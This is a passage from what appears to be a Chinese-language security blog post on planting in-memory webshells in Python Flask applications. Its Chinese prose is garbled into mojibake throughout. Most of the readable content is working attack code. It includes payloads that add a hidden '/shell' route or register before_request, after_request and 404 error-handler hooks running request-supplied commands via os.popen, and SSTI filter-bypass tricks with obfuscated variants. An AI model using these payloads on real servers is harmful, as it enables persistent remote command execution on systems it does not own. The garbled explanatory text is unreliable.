</div><p>Êé•ÁùÄÂÜçÊù•ÁúãÁúã<code>app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())</code>Ëøô‰∏ÄÊà™<code>Payload</code>. ËøôÈÉ®ÂàÜÊòØÂä®ÊÄÅÊ∑ªÂä†‰∫Ü‰∏ÄÊù°Ë∑ØÁî±, ËÄåÂ§ÑÁêÜËØ•Ë∑ØÁî±ÁöÑÂáΩÊï∞ÊòØ‰∏™Áî±<code>lambda</code>ÂÖ≥ÈîÆÂ≠óÂÆö‰πâÁöÑÂåøÂêçÂáΩÊï∞.</p>
<p>Âú®<code>Flask</code>‰∏≠Ê≥®ÂÜåË∑ØÁî±ÁöÑÊó∂ÂÄôÊòØÊ∑ªÂä†ÁöÑ<code>@app.route()</code>Ë£ÖÈ•∞Âô®Êù•ÂÆûÁé∞ÁöÑ, Ë∑üËøõÊü•ÁúãÂÖ∂Ê∫êÁ†ÅÂÆûÁé∞, ÂèëÁé∞ÂÖ∂Ë∞ÉÁî®‰∫Ü<code>add_url_rule</code>ÂáΩÊï∞Êù•Ê∑ªÂä†Ë∑ØÁî±.</p>
<p><code>lambda</code>Âç≥ÂåøÂêçÂáΩÊï∞, <code>Payload</code>‰∏≠<code>add_url_rule</code>ÂáΩÊï∞ÁöÑÁ¨¨‰∏â‰∏™ÂèÇÊï∞ÂÆö‰πâ‰∫Ü‰∏Ä‰∏™<code>lambda</code>ÂåøÂêçÂáΩÊï∞, ÂÖ∂‰∏≠ÈÄöËøá<code>os</code>Â∫ìÁöÑ<code>popen</code>ÂáΩÊï∞ÊâßË°å‰ªé<code>Web</code>ËØ∑Ê±Ç‰∏≠Ëé∑ÂèñÁöÑ<code>cmd</code>ÂèÇÊï∞ÂÄºÂπ∂ËøîÂõûÁªìÊûú, ÂÖ∂‰∏≠ËØ•ÂèÇÊï∞ÂÄºÈªòËÆ§‰∏∫<code>whoami</code>.</p>
<h3 id="sysmodules">sys.modules
</h3><blockquote>
<p>sys.modulesÊòØ‰∏Ä‰∏™ÂÖ®Â±ÄÂ≠óÂÖ∏ÔºåËØ•Â≠óÂÖ∏ÊòØpythonÂêØÂä®ÂêéÂ∞±Âä†ËΩΩÂú®ÂÜÖÂ≠ò‰∏≠„ÄÇÊØèÂΩìÁ®ãÂ∫èÂëòÂØºÂÖ•Êñ∞ÁöÑÊ®°ÂùóÔºåsys.modulesÈÉΩÂ∞ÜËÆ∞ÂΩïËøô‰∫õÊ®°Âùó„ÄÇÂ≠óÂÖ∏sys.modulesÂØπ‰∫éÂä†ËΩΩÊ®°ÂùóËµ∑Âà∞‰∫ÜÁºìÂÜ≤ÁöÑ‰ΩúÁî®„ÄÇÂΩìÊüê‰∏™Ê®°ÂùóÁ¨¨‰∏ÄÊ¨°ÂØºÂÖ•ÔºåÂ≠óÂÖ∏sys.modulesÂ∞ÜËá™Âä®ËÆ∞ÂΩïËØ•Ê®°Âùó„ÄÇÂΩìÁ¨¨‰∫åÊ¨°ÂÜçÂØºÂÖ•ËØ•Ê®°ÂùóÊó∂Ôºåpython‰ºöÁõ¥Êé•Âà∞Â≠óÂÖ∏‰∏≠Êü•ÊâæÔºå‰ªéËÄåÂä†Âø´‰∫ÜÁ®ãÂ∫èËøêË°åÁöÑÈÄüÂ∫¶„ÄÇ</p>
</blockquote>
<p>ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÈÄöËøásys.modulesÊãøÂà∞ÂΩìÂâçÂ∑≤ÁªèÂØºÂÖ•ÁöÑÊ®°ÂùóÔºåÂπ∂‰∏îËé∑ÂèñÊ®°Âùó‰∏≠ÁöÑÂ±ûÊÄßÔºåÁî±‰∫éÊàë‰ª¨ÊúÄÁªàÁöÑevalÊòØÂú®app.py‰∏≠ÊâßË°åÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÈÄöËøá<code>sys.modules['__main__']</code>Êù•Ëé∑ÂèñÂΩìÂâçÁöÑÊ®°Âùó</p>
<p>Êàë‰ª¨ÈúÄË¶ÅÂú®ÈùûdebugÊ®°Âºè‰∏ãÊâçËÉΩÊàêÂäüÊ∑ªÂä†ÂêéÈó®Ë∑ØÁî±</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">debug</span><span class="o">=</span><span class="kc">False</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">add_url_rule</span><span class="p">(</span><span class="s1">&#39;/shell&#39;</span><span class="p">,</span><span class="s1">&#39;shell&#39;</span><span class="p">,</span><span class="k">lambda</span> <span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="bypassÊñπÊ≥ï">bypassÊñπÊ≥ï
</h3><ul>
<li><code>url_for</code>ÂèØÊõøÊç¢‰∏∫<code>get_flashed_messages</code>ÊàñËÄÖ<code>request.__init__</code>ÊàñËÄÖ<code>request.application</code>.</li>
<li>‰ª£Á†ÅÊâßË°åÂáΩÊï∞ÊõøÊç¢, Â¶Ç<code>exec</code>Á≠âÊõøÊç¢<code>eval</code>.</li>
<li>Â≠óÁ¨¶‰∏≤ÂèØÈááÁî®ÊãºÊé•ÊñπÂºè, Â¶Ç<code>['__builtins__']['eval']</code>Âèò‰∏∫<code>['__bui'+'ltins__']['ev'+'al']</code>.</li>
<li><code>__globals__</code>ÂèØÁî®<code>__getattribute__('__globa'+'ls__')</code>ÊõøÊç¢.</li>
<li><code>[]</code>ÂèØÁî®<code>.__getitem__()</code>Êàñ<code>.pop()</code>ÊõøÊç¢.</li>
<li>ËøáÊª§<code>{{</code>ÊàñËÄÖ<code>}}</code>, ÂèØ‰ª•‰ΩøÁî®<code>{%</code>ÊàñËÄÖ<code>%}</code>ÁªïËøá, <code>{%%}</code>‰∏≠Èó¥ÂèØ‰ª•ÊâßË°å<code>if</code>ËØ≠Âè•, Âà©Áî®Ëøô‰∏ÄÁÇπÂèØ‰ª•ËøõË°åÁ±ª‰ººÁõ≤Ê≥®ÁöÑÊìç‰ΩúÊàñËÄÖÂ§ñÂ∏¶‰ª£Á†ÅÊâßË°åÁªìÊûú.</li>
<li>ËøáÊª§<code>_</code>ÂèØ‰ª•Áî®ÁºñÁ†ÅÁªïËøá, Â¶Ç<code>__class__</code>ÊõøÊç¢Êàê<code>\x5f\x5fclass\x5f\x5f</code>, ËøòÂèØ‰ª•Áî®<code>dir(0)[0][0]</code>ÊàñËÄÖ<code>request['args']</code>ÊàñËÄÖ<code>request['values']</code>ÁªïËøá.</li>
<li>ËøáÊª§‰∫Ü<code>.</code>ÂèØ‰ª•ÈááÁî®<code>attr()</code>Êàñ<code>[]</code>ÁªïËøá.</li>
<li>ÂÖ∂ÂÆÉÁöÑÊâãÊ≥ïÂèÇËÄÉ<code>SSTI</code>ÁªïËøáËøáÊª§ÁöÑÊñπÊ≥ïÂç≥ÂèØ</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">ÂèòÂΩ¢</span><span class="n">payload</span>
</span></span><span class="line"><span class="cl"><span class="n">request</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="n">__self__</span><span class="o">.</span><span class="n">_get_data_for_json</span><span class="o">.</span><span class="n">__getattribute__</span><span class="p">(</span><span class="s1">&#39;__globa&#39;</span><span class="o">+</span><span class="s1">&#39;ls__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">__getitem__</span><span class="p">(</span><span class="s1">&#39;__bui&#39;</span><span class="o">+</span><span class="s1">&#39;ltins__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">__getitem__</span><span class="p">(</span><span class="s1">&#39;ex&#39;</span><span class="o">+</span><span class="s1">&#39;ec&#39;</span><span class="p">)(</span><span class="s2">&#34;app.add_url_rule(&#39;/h3rmesk1t&#39;, &#39;h3rmesk1t&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;shell&#39;, &#39;calc&#39;)).read())&#34;</span><span class="p">,{</span><span class="s1">&#39;_request_ct&#39;</span><span class="o">+</span><span class="s1">&#39;x_stack&#39;</span><span class="p">:</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="n">__getattribute__</span><span class="p">(</span><span class="s1">&#39;__globa&#39;</span><span class="o">+</span><span class="s1">&#39;ls__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;_request_&#39;</span><span class="o">+</span><span class="s1">&#39;ctx_stack&#39;</span><span class="p">),</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="n">__getattribute__</span><span class="p">(</span><span class="s1">&#39;__globa&#39;</span><span class="o">+</span><span class="s1">&#39;ls__&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;curre&#39;</span><span class="o">+</span><span class="s1">&#39;nt_app&#39;</span><span class="p">)})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get_flashed_messages</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">globals</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\u0065\u0076\u0061\u006c</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;app.add_ur&#34;</span><span class="o">+</span><span class="s2">&#34;l_rule(&#39;/h3rmesk1t&#39;, &#39;h3rmesk1t&#39;, la&#34;</span><span class="o">+</span><span class="s2">&#34;mbda :__imp&#34;</span><span class="o">+</span><span class="s2">&#34;ort__(&#39;o&#34;</span><span class="o">+</span><span class="s2">&#34;s&#39;).po&#34;</span><span class="o">+</span><span class="s2">&#34;pen(_request_c&#34;</span><span class="o">+</span><span class="s2">&#34;tx_stack.to&#34;</span><span class="o">+</span><span class="s2">&#34;p.re&#34;</span><span class="o">+</span><span class="s2">&#34;quest.args.get(&#39;shell&#39;)).re&#34;</span><span class="o">+</span><span class="s2">&#34;ad())&#34;</span><span class="p">,{</span><span class="s1">&#39;</span><span class="se">\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b</span><span class="s1">&#39;</span><span class="p">:</span><span class="n">get_flashed_messages</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">globals</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b</span><span class="s2">&#34;</span><span class="p">),</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">get_flashed_messages</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">globals</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getattribute</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\x5f\x5f</span><span class="s2">getitem</span><span class="se">\x5f\x5f</span><span class="s2">&#34;</span><span class="p">)(</span><span class="s2">&#34;</span><span class="se">\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070</span><span class="s2">&#34;</span><span class="p">)})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="Êñ∞ÁâàflaskÂÜÖÂ≠òÈ©¨">Êñ∞ÁâàflaskÂÜÖÂ≠òÈ©¨
</h2><p>ÂèÇËÄÉÔºö<a class="link" href="https://www.cnblogs.com/gxngxngxn/p/18181936"  target="_blank" rel="noopener"
    >Êñ∞ÁâàFLASK‰∏ãpythonÂÜÖÂ≠òÈ©¨ÁöÑÁ†îÁ©∂ - gxngxngxn - ÂçöÂÆ¢Âõ≠</a></p>
<p>Âú®ÊúÄÊñ∞ÁâàÊú¨ÁöÑFlask‰∏≠ÔºåÂ¶ÇÊûúÁõ¥Êé•‰ΩøÁî®Ëøô‰∏™payload‰ºöÂèëÁé∞Â∞ÜÊäõÂá∫‰∏Ä‰∏™ÂºÇÂ∏∏„ÄÇ</p>
<p>‰ΩÜÊòØÂèØ‰ª•Âà©Áî®<code>@app.before_request</code> <code>@app.after_request</code>ÊñπÊ≥ïÊù•Êâì</p>
<h3 id="before_request">before_request
</h3><p>Êàë‰ª¨ÊØèÊ¨°ÂèëËµ∑ËØ∑Ê±Ç‰πãÂâçÔºåÂ∞±‰ºöË∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÔºåËß¶ÂèëÈáåÈù¢ÂÆö‰πâÁöÑÂáΩÊï∞</p>
<p>ÈáåÈù¢Ë∞ÉÁî®‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">before_request_funcs</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="p">[])</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéfÂ∞±ÊòØËÆøÈóÆÂÄºÔºå‰πüÊòØÊàë‰ª¨ÂèØ‰ª•Ëá™ÂÆö‰πâÁöÑÔºåÈÇ£‰πàËøôÈáåÂè™Ë¶ÅÊàë‰ª¨ËÆæÁΩÆf‰∏∫‰∏Ä‰∏™ÂåøÂêçÂáΩÊï∞ÔºåÁ±ª‰ºº‰πãÂâç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">lambda</span> <span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#39;os&#39;).popen(&#39;dir&#39;).read())&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="after_request">after_request
</h3><p>Ëøô‰∏™ÊòØÂú®ËØ∑Ê±ÇÂÆåÊàêÂêéË∞ÉÁî®ÔºåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØËøô‰∏™ÊòØÈúÄË¶ÅÂÆö‰πâ‰∏Ä‰∏™ËøîÂõûÂÄºÁöÑÔºå‰∏çÁÑ∂Â∞±Êä•Èîô„ÄÇ</p>
<p>ÂèÇËÄÉËøô‰∏™Ôºö<a class="link" href="https://xz.aliyun.com/news/13858"  target="_blank" rel="noopener"
    >Python FlaskÂÜÖÂ≠òÈ©¨ÁöÑÂè¶ËæüÈÄîÂæÑ-ÂÖàÁü•Á§æÂå∫</a></p>
<p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>‰º†ÂÖ•ÁöÑfÂ∞±ÊòØÂØπÂ∫îÁöÑËá™ÂÆö‰πâÂáΩÊï∞Ôºå‰ΩÜËøôÈáåÁöÑfÈúÄË¶ÅÊé•Êî∂‰∏Ä‰∏™responseÂØπË±°ÔºåÂêåÊó∂ËøîÂõû‰∏Ä‰∏™responseÂØπË±°„ÄÇ</p>
<p>‰ΩÜÊàë‰ª¨‰ªÖÈÄöËøálambaÊó†Ê≥ïÂØπÂéüÂßã‰º†ËøõÊù•ÁöÑresponseËøõË°å‰øÆÊîπÂêéÂÜçËøîÂõûÔºåÊâÄ‰ª•ÈúÄË¶ÅÈáçÊñ∞ÁîüÊàê‰∏Ä‰∏™responseÂØπË±°ÔºåÁÑ∂ÂêéÂÜçËøîÂõûËøô‰∏™response„ÄÇ</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">eval</span><span class="p">(</span><span class="s2">&#34;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(</span><span class="se">\&#34;</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(__import__(</span><span class="se">\&#39;</span><span class="s2">os</span><span class="se">\&#39;</span><span class="s2">).popen(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&#34;</span><span class="s2">)==None else resp)&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøòÊâæÂà∞‰∫ÜÂÖ∂‰ªñÈí©Â≠êÂáΩÊï∞</p>
<h3 id="errorhandler">errorhandler
</h3><p>Ëøô‰∏™ÂáΩÊï∞ÂèØ‰ª•Áî®‰∫éËá™ÂÆö‰πâ404È°µÈù¢ÁöÑÂõûÊòæ</p>
<p>Ë∑üËøõregister_error_handlerÂáΩÊï∞,</p>
<p><img src="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250416215450046.png"
	width="1426"
	height="134"
	srcset="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250416215450046_hu14993857377928626853.png 480w, /p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250416215450046_hu14094793102838107899.png 1024w"
	loading="lazy"
	
		alt="image-20250416215450046"
	
	
		class="gallery-image" 
		data-flex-grow="1064"
		data-flex-basis="2554px"
	
></p>
<p>code_or_exceptionÂíåfÂ∞±ÊòØ‰πãÂâçÁöÑÈÇ£‰∏§‰∏™ÂèÇÊï∞ÔºåÂ¶ÇÊûúÊàë‰ª¨ÁªïËøá‰∏äÈù¢ÁöÑregister_error_handlerÂáΩÊï∞ÔºåÂØπËøôÈáåÁöÑÂáΩÊï∞ËøõË°åÊéßÂà∂Ôºå‰∏ÄÊ†∑ÂèØ‰ª•ËææÂà∞Êàë‰ª¨ÁöÑÁõÆÁöÑ„ÄÇ</p>
<p>ËÄå<strong>code</strong>Âíå<strong>f</strong>ÊòØÊàë‰ª¨ÊØîËæÉÊñπ‰æøÂèØ‰ª•ÊâãÂä®ÊûÑÈÄ†ÁöÑÔºå‰ΩÜÊòØ<strong>exc_class</strong>‰∏çÂ§™Â•ΩÊàë‰ª¨Ëá™Â∑±ÊûÑÈÄ†ÔºåÊàë‰ª¨ÁúãÂà∞Ëøô‰∏§‰∏™ÂèòÈáèÊòØÈÄöËøá<code>_get_exc_class_and_code</code>ÂáΩÊï∞Ëé∑ÂèñÁöÑÔºåËøô‰∏™ÂáΩÊï∞ÁöÑÂèÇÊï∞<strong>code_or_exception</strong>Â∞±ÊòØÊàë‰ª¨‰πãÂâç‰º†ÁöÑ404ÔºåÈÇ£Êàë‰ª¨Â∞±‰æùÈù†Ëøô‰∏™Êù•Ëé∑ÂèñÂèòÈáèÂÄºÔºåÁÑ∂ÂêéË¶ÜÂÜôÂõæ‰∏≠Ëøô‰∏§‰∏™ÂáΩÊï∞Âç≥ÂèØ</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">exec</span><span class="p">(</span><span class="s2">&#34;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;gxngxngxn&#39;)).read()&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂâçÈù¢ÊèêÂà∞Êñ∞ÁâàÊ≤°ÂäûÊ≥ïÁî®ËÄÅÁâàÁöÑpayloadÊòØ‰ºöÊäõÂá∫ÈîôËØØ</p>
<h3 id="ËøòÊòØÂà©Áî®add_url_rule">ËøòÊòØÂà©Áî®add_url_rule
</h3><p>ÂõûÂ§¥Áúãadd_url_ruleÂáΩÊï∞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rule_obj</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url_rule_class</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="n">methods</span><span class="p">,</span> <span class="o">**</span><span class="n">options</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rule_obj</span><span class="o">.</span><span class="n">provide_automatic_options</span> <span class="o">=</span> <span class="n">provide_automatic_options</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">url_map</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">rule_obj</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">view_func</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">old_func</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">view_functions</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">old_func</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">old_func</span> <span class="o">!=</span> <span class="n">view_func</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">AssertionError</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;View function mapping is overwriting an existing&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34; endpoint function: </span><span class="si">{</span><span class="n">endpoint</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">view_functions</span><span class="p">[</span><span class="n">endpoint</span><span class="p">]</span> <span class="o">=</span> <span class="n">view_func</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèëÁé∞Âú®ÂáΩÊï∞Êú´Â∞æÁöÑÂ§ÑÁêÜ‰∏≠ÔºåÂ∞Ü <code>rule_obj</code> ÂØπË±°Ê∑ªÂä†Âà∞‰∫Ü <code>url_map</code> ‰∏≠Ôºå‰πãÂêéÂ∞Ü <code>view_func</code> ‰Ωú‰∏∫‰∫Ü <code>view_functions</code> Â≠óÂÖ∏‰∏≠ <code>endpoint</code> ÈîÆÁöÑÂÄºÔºåÊâÄ‰ª•ÁêÜËÆ∫‰∏äÊù•ËÆ≤ÔºåÂèØ‰ª•ÈÄöËøáÁõ¥Êé•Êìç‰ΩúËøô‰∏§‰∏™ÂèòÈáèÊù•ÂÆåÊàê‰∏ÄÊ¨°ÊâãÂä®ÁöÑ <code>add_url_rule</code></p>
<p><code>url_map</code> Âíå <code>view_functions</code> ÁöÑÂÆö‰πâÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">url_map_class</span> <span class="o">=</span> <span class="n">Map</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">view_functions</span><span class="p">:</span> <span class="nb">dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">ft</span><span class="o">.</span><span class="n">RouteCallable</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">url_map</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url_map_class</span><span class="p">(</span><span class="n">host_matching</span><span class="o">=</span><span class="n">host_matching</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊºèÊ¥ûÁéØÂ¢É</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
